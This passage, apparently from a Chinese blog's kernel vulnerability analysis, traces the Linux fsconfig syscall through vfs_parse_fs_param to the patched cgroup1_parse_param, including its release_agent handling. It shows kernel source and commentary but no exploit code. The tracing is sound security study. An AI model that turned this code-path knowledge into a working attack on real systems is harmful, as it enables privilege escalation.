path.  A conversion to an</span><br><span class="hljs-comment"> *     appropriate type will be attempted (which may include looking up as a</span><br><span class="hljs-comment"> *     path).  @_value points to a NUL-terminated string and @aux must be 0.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_binary: A binary blob is specified.  @_value points to the</span><br><span class="hljs-comment"> *     blob and @aux indicates its size.  The parameter must be expecting a</span><br><span class="hljs-comment"> *     blob.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_path: A non-empty path is specified.  The parameter must be</span><br><span class="hljs-comment"> *     expecting a path object.  @_value points to a NUL-terminated string that</span><br><span class="hljs-comment"> *     is the path and @aux is a file descriptor at which to start a relative</span><br><span class="hljs-comment"> *     lookup or AT_FDCWD.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_path_empty: As fsconfig_set_path, but with AT_EMPTY_PATH</span><br><span class="hljs-comment"> *     implied.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * (*) fsconfig_set_fd: An open file descriptor is specified.  @_value must be</span><br><span class="hljs-comment"> *     NULL and @aux indicates the file descriptor.</span><br><span class="hljs-comment"> */</span><br>SYSCALL_DEFINE5(fsconfig,<br><span class="hljs-type">int</span>, fd,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, cmd,<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _key,<br><span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *, _value,<br><span class="hljs-type">int</span>, aux)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span>;</span><br><span class="hljs-type">int</span> ret;<br><span class="hljs-type">int</span> lookup_flags = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//定义了一个struct fs_parameter param变量</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> <span class="hljs-title">param</span> =</span> &#123;<br>.type= fs_value_is_undefined,<br>&#125;;<br><br><span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-comment">//一堆switch</span><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FLAG:<br><span class="hljs-keyword">if</span> (!_key || _value || aux)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br><span class="hljs-keyword">if</span> (!_key || !_value || aux)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_BINARY:<br><span class="hljs-keyword">if</span> (!_key || !_value || aux &lt;= <span class="hljs-number">0</span> || aux &gt; <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH_EMPTY:<br><span class="hljs-keyword">if</span> (!_key || !_value || (aux != AT_FDCWD &amp;&amp; aux &lt; <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FD:<br><span class="hljs-keyword">if</span> (!_key || _value || aux &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_CMD_CREATE:<br><span class="hljs-keyword">case</span> FSCONFIG_CMD_RECONFIGURE:<br><span class="hljs-keyword">if</span> (_key || _value || aux)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -EOPNOTSUPP;<br>&#125;<br><br>f = fdget(fd);<br><span class="hljs-keyword">if</span> (!f.file)<br><span class="hljs-keyword">return</span> -EBADF;<br>ret = -EINVAL;<br>    <span class="hljs-comment">//判断当前通过fd得到的文件实例的方法集是不是fscontext_fops</span><br><span class="hljs-keyword">if</span> (f.file-&gt;f_op != &amp;fscontext_fops)<br><span class="hljs-keyword">goto</span> out_f;<br><br>fc = f.file-&gt;private_data;<br><span class="hljs-keyword">if</span> (fc-&gt;ops == &amp;legacy_fs_context_ops) &#123;<br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_BINARY:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH_EMPTY:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FD:<br>ret = -EOPNOTSUPP;<br><span class="hljs-keyword">goto</span> out_f;<br>&#125;<br>&#125;<br><span class="hljs-comment">//把这个字符串赋值到param.key</span><br><span class="hljs-keyword">if</span> (_key) &#123;<br>param.key = strndup_user(_key, <span class="hljs-number">256</span>);<br><span class="hljs-keyword">if</span> (IS_ERR(param.key)) &#123;<br>ret = PTR_ERR(param.key);<br><span class="hljs-keyword">goto</span> out_f;<br>&#125;<br>&#125;<br><span class="hljs-comment">//根据不同的cmd，确定不同的操作</span><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FLAG:<br>param.type = fs_value_is_flag;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br>param.type = fs_value_is_string;<br>param.<span class="hljs-built_in">string</span> = strndup_user(_value, <span class="hljs-number">256</span>);<br><span class="hljs-keyword">if</span> (IS_ERR(param.<span class="hljs-built_in">string</span>)) &#123;<br>ret = PTR_ERR(param.<span class="hljs-built_in">string</span>);<br><span class="hljs-keyword">goto</span> out_key;<br>&#125;<br>param.size = <span class="hljs-built_in">strlen</span>(param.<span class="hljs-built_in">string</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_BINARY:<br>param.type = fs_value_is_blob;<br>param.size = aux;<br>param.blob = memdup_user_nul(_value, aux);<br><span class="hljs-keyword">if</span> (IS_ERR(param.blob)) &#123;<br>ret = PTR_ERR(param.blob);<br><span class="hljs-keyword">goto</span> out_key;<br>&#125;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH_EMPTY:<br>lookup_flags = LOOKUP_EMPTY;<br><span class="hljs-comment">/* fallthru */</span><br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH:<br>param.type = fs_value_is_filename;<br>param.name = getname_flags(_value, lookup_flags, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (IS_ERR(param.name)) &#123;<br>ret = PTR_ERR(param.name);<br><span class="hljs-keyword">goto</span> out_key;<br>&#125;<br>param.dirfd = aux;<br>param.size = <span class="hljs-built_in">strlen</span>(param.name-&gt;name);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FD:<br>param.type = fs_value_is_file;<br>ret = -EBADF;<br>param.file = fget(aux);<br><span class="hljs-keyword">if</span> (!param.file)<br><span class="hljs-keyword">goto</span> out_key;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">//加锁</span><br>ret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex);<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>) &#123;<br>ret = vfs_fsconfig_locked(fc, cmd, &amp;param);<span class="hljs-comment">//very important</span><br>mutex_unlock(&amp;fc-&gt;uapi_mutex);<br>&#125;<br><br><span class="hljs-comment">/* Clean up the our record of any value that we obtained from</span><br><span class="hljs-comment"> * userspace.  Note that the value may have been stolen by the LSM or</span><br><span class="hljs-comment"> * filesystem, in which case the value pointer will have been cleared.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_BINARY:<br>kfree(param.<span class="hljs-built_in">string</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH_EMPTY:<br><span class="hljs-keyword">if</span> (param.name)<br>putname(param.name);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FD:<br><span class="hljs-keyword">if</span> (param.file)<br>fput(param.file);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br>out_key:<br>kfree(param.key);<br>out_f:<br>fdput(f);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先是一个结构体变量，这个变量将用于下面的一系列操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> <span class="hljs-title">param</span> =</span> &#123;<br>                .type   = fs_value_is_undefined,<br>        &#125;;<br></code></pre></td></tr></table></figure><p>看一下<code>define</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> &#123;</span><br>        <span class="hljs-type">const</span> <span class="hljs-type">char</span>              *key;           <span class="hljs-comment">/* Parameter name */</span><br>        <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_value_type</span>      <span class="hljs-title">type</span>:</span><span class="hljs-number">8</span>;         <span class="hljs-comment">/* The type of value here */</span><br>        <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>                <span class="hljs-type">char</span>            *<span class="hljs-built_in">string</span>;<br>                <span class="hljs-type">void</span>            *blob;<br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">filename</span> *<span class="hljs-title">name</span>;</span><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span>     *<span class="hljs-title">file</span>;</span><br>        &#125;;<br>        <span class="hljs-type">size_t</span>  size;<br>        <span class="hljs-type">int</span>     dirfd;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="vfs-fsconfig-locked"><a href="#vfs-fsconfig-locked" class="headerlink" title="vfs_fsconfig_locked"></a><strong>vfs_fsconfig_locked</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Check the state and apply the configuration.  Note that this function is</span><br><span class="hljs-comment"> * allowed to &#x27;steal&#x27; the value by setting param-&gt;xxx to NULL before returning.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vfs_fsconfig_locked</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-type">int</span> cmd,</span><br><span class="hljs-params">       <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">super_block</span> *<span class="hljs-title">sb</span>;</span><br><span class="hljs-type">int</span> ret;<br><br>ret = finish_clean_context(fc);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_CMD_CREATE:<br>            <span class="hljs-comment">//检查fc的阶段是否为FS_CONTEXT_CREATE_PARAMS</span><br><span class="hljs-keyword">if</span> (fc-&gt;phase != FS_CONTEXT_CREATE_PARAMS)<br><span class="hljs-keyword">return</span> -EBUSY;<br>            <span class="hljs-comment">//检查是否有创建文件系统的权限</span><br><span class="hljs-keyword">if</span> (!mount_capable(fc))<br><span class="hljs-keyword">return</span> -EPERM;<br>            <span class="hljs-comment">//设置fc的阶段为FS_CONTEXT_CREATING</span><br>fc-&gt;phase = FS_CONTEXT_CREATING;<br>            <span class="hljs-comment">//获取文件树</span><br>ret = vfs_get_tree(fc);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">break</span>;<br>sb = fc-&gt;root-&gt;d_sb;<br>ret = security_sb_kern_mount(sb);<br><span class="hljs-keyword">if</span> (unlikely(ret)) &#123;<br>fc_drop_locked(fc);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>up_write(&amp;sb-&gt;s_umount);<br>            <span class="hljs-comment">//将fc的阶段设置为FS_CONTEXT_AWAITING_MOUNT并返回成功</span><br>fc-&gt;phase = FS_CONTEXT_AWAITING_MOUNT;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">case</span> FSCONFIG_CMD_RECONFIGURE:<br><span class="hljs-keyword">if</span> (fc-&gt;phase != FS_CONTEXT_RECONF_PARAMS)<br><span class="hljs-keyword">return</span> -EBUSY;<br>fc-&gt;phase = FS_CONTEXT_RECONFIGURING;<br>sb = fc-&gt;root-&gt;d_sb;<br><span class="hljs-keyword">if</span> (!ns_capable(sb-&gt;s_user_ns, CAP_SYS_ADMIN)) &#123;<br>ret = -EPERM;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>down_write(&amp;sb-&gt;s_umount);<br>ret = reconfigure_super(fc);<br>up_write(&amp;sb-&gt;s_umount);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">break</span>;<br>vfs_clean_context(fc);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">if</span> (fc-&gt;phase != FS_CONTEXT_CREATE_PARAMS &amp;&amp;<br>    fc-&gt;phase != FS_CONTEXT_RECONF_PARAMS)<br><span class="hljs-keyword">return</span> -EBUSY;<br><span class="hljs-comment">//默认执行此处</span><br><span class="hljs-keyword">return</span> vfs_parse_fs_param(fc, param);<br>&#125;<br>fc-&gt;phase = FS_CONTEXT_FAILED;<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="vfs-parse-fs-param"><a href="#vfs-parse-fs-param" class="headerlink" title="vfs_parse_fs_param"></a>vfs_parse_fs_param</h3><p>在此之前，我们完成了对<strong>param</strong>的赋值。现在要做的就是把<strong>param</strong>里的参数转到文件系统上下文里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * vfs_parse_fs_param - Add a single parameter to a superblock config</span><br><span class="hljs-comment"> * @fc: The filesystem context to modify</span><br><span class="hljs-comment"> * @param: The parameter</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * A single mount option in string form is applied to the filesystem context</span><br><span class="hljs-comment"> * being set up.  Certain standard options (for example &quot;ro&quot;) are translated</span><br><span class="hljs-comment"> * into flag bits without going to the filesystem.  The active security module</span><br><span class="hljs-comment"> * is allowed to observe and poach options.  Any other options are passed over</span><br><span class="hljs-comment"> * to the filesystem to parse.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This may be called multiple times for a context.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Returns 0 on success and a negative error code on failure.  In the event of</span><br><span class="hljs-comment"> * failure, supplementary error information may have been set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">vfs_parse_fs_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-keyword">if</span> (!param-&gt;key)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;Unnamed parameter\n&quot;</span>);<br><br>ret = vfs_parse_sb_flag(fc, param-&gt;key);<br><span class="hljs-keyword">if</span> (ret != -ENOPARAM)<br><span class="hljs-keyword">return</span> ret;<br><br>ret = security_fs_context_parse_param(fc, param);<br><span class="hljs-keyword">if</span> (ret != -ENOPARAM)<br><span class="hljs-comment">/* Param belongs to the LSM or is disallowed by the LSM; so</span><br><span class="hljs-comment"> * don&#x27;t pass to the FS.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">return</span> ret;<br><br><span class="hljs-keyword">if</span> (fc-&gt;ops-&gt;parse_param) &#123;<br>ret = fc-&gt;ops-&gt;parse_param(fc, param);<br><span class="hljs-keyword">if</span> (ret != -ENOPARAM)<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">/* If the filesystem doesn&#x27;t take any arguments, give it the</span><br><span class="hljs-comment"> * default handling of source.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(param-&gt;key, <span class="hljs-string">&quot;source&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">if</span> (param-&gt;type != fs_value_is_string)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Non-string source&quot;</span>);<br><span class="hljs-keyword">if</span> (fc-&gt;source)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Multiple sources&quot;</span>);<br>fc-&gt;source = param-&gt;<span class="hljs-built_in">string</span>;<br>param-&gt;<span class="hljs-built_in">string</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;%s: Unknown parameter &#x27;%s&#x27;&quot;</span>,<br>      fc-&gt;fs_type-&gt;name, param-&gt;key);<br>&#125;<br></code></pre></td></tr></table></figure><p>其中最重要的一句是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ret = fc-&gt;ops-&gt;parse_param(fc, param);<br></code></pre></td></tr></table></figure><p>很显然，这里是需要使用文件系统上下文中的<code>parse_param</code>方法，如果我们设置文件系统为<code>cgroup1</code></p><p>则会调用到<code>cgroup1_parse_param</code></p><h3 id="cgroup1-parse-param"><a href="#cgroup1-parse-param" class="headerlink" title="cgroup1_parse_param"></a>cgroup1_parse_param</h3><p>于此，我们终于来到了<code>patch</code>中的目标函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">cgroup1_parse_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cgroup_fs_context</span> *<span class="hljs-title">ctx</span> =</span> cgroup_fc2context(fc);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cgroup_subsys</span> *<span class="hljs-title">ss</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parse_result</span> <span class="hljs-title">result</span>;</span><br><span class="hljs-type">int</span> opt, i;<br><span class="hljs-comment">//主要的挂载参数的解析函数</span><br>opt = fs_parse(fc, cgroup1_fs_parameters, param, &amp;result);<br><span class="hljs-keyword">if</span> (opt == -ENOPARAM) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(param-&gt;key, <span class="hljs-string">&quot;source&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>fc-&gt;source = param-&gt;<span class="hljs-built_in">string</span>;<br>param-&gt;<span class="hljs-built_in">string</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>for_each_subsys(ss, i) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(param-&gt;key, ss-&gt;legacy_name))<br><span class="hljs-keyword">continue</span>;<br>ctx-&gt;subsys_mask |= (<span class="hljs-number">1</span> &lt;&lt; i);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">return</span> invalfc(fc, <span class="hljs-string">&quot;Unknown subsys name &#x27;%s&#x27;&quot;</span>, param-&gt;key);<br>&#125;<br><span class="hljs-keyword">if</span> (opt &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> opt;<br><br><span class="hljs-keyword">switch</span> (opt) &#123;<br><span class="hljs-keyword">case</span> Opt_none:<br><span class="hljs-comment">/* Explicitly have no subsystems */</span><br>ctx-&gt;none = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> Opt_all:<br>ctx-&gt;all_ss = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> Opt_noprefix:<br>ctx-&gt;flags |= CGRP_ROOT_NOPREFIX;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> Opt_clone_children:<br>ctx-&gt;cpuset_clone_children = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> Opt_cpuset_v2_mode:<br>ctx-&gt;flags |= CGRP_ROOT_CPUSET_V2_MODE;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> Opt_xattr:<br>ctx-&gt;flags |= CGRP_ROOT_XATTR;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> Opt_release_agent:<br><span class="hljs-comment">/* Specifying two release agents is forbidden */</span><br><span class="hljs-keyword">if</span> (ctx-&gt;release_agent)<br><span class="hljs-keyword">return</span> invalfc(fc, <span class="hljs-string">&quot;release_agent respecified&quot;</span>);<br>ctx-&gt;release_agent = param-&gt;<span class="hljs-built_in">string</span>;<br>param-&gt;<span class="hljs-built_in">string</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> Opt_name:<br><span class="hljs-comment">/* blocked by boot param? */</span><br><span class="hljs-keyword">if</span> (cgroup_no_v1_named)<br><span class="hljs-keyword">return</span> -ENOENT;<br><span class="hljs-comment">/* Can&#x27;t specify an empty name */</span><br><span class="hljs-keyword">if</span> (!param-&gt;size)<br><span class="hljs-keyword">return</span> invalfc(fc, <span class="hljs-string">&quot;Empty name&quot;</span>);<br><span class="hljs-keyword">if</span> (param-&gt;size &gt; MAX_CGROUP_ROOT_NAMELEN - <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> invalfc(fc, <span class="hljs-string">&quot;Name too long&quot;</span>);<br><span class="hljs-comment">/* Must match [\w.-]+ */</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; param-&gt;size; i++) &#123;<br><span class="hljs-type">char</span> c = param-&gt;<span class="hljs-built_in">string</span>[i];<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">isalnum</span>(c))<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">if</span> ((c == <span class="hljs-string">&#x27;.&#x27;</span>) || (c == <span class="hljs-string">&#x27;-&#x27;</span>) || (c == <span class="hljs-string">&#x27;_&#x27;</span>))<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">return</span> invalfc(fc, <span class="hljs-string">&quot;Invalid name&quot;</span>);<br>&#125;<br><span class="hljs-comment">/* Specifying two names is forbidden */</span><br><span class="hljs-keyword">if</span> (ctx-&gt;name)<br><span class="hljs-keyword">return</span> invalfc(fc, <span class="hljs-string">&quot;name respecified&quot;</span>);<br>ctx-&gt;name = param-&gt;<span class="hljs-built_in">string</span>;<br>param-&gt;<span class="hljs-built_in">string</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>调用链可以确定下来</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">sys_fsconfig</span>()<br><span class="hljs-built_in">vfs_fsconfig_locked</span>()<br><span class="hljs-built_in">vfs_parse_fs_param</span>()<br>fc-&gt;ops-&gt;<span class="hljs-built_in">parse_param</span>(cgroup1_parse_param)<br></code></pre></td></tr></table></figure><p>到此我们具备了创建一个挂载实例的所有准备工作，下一步就是创建一个挂载实例</p><p>创建一个挂载实例需要使用<code>fsmount()</code></p><h2 id="fsmount"><a 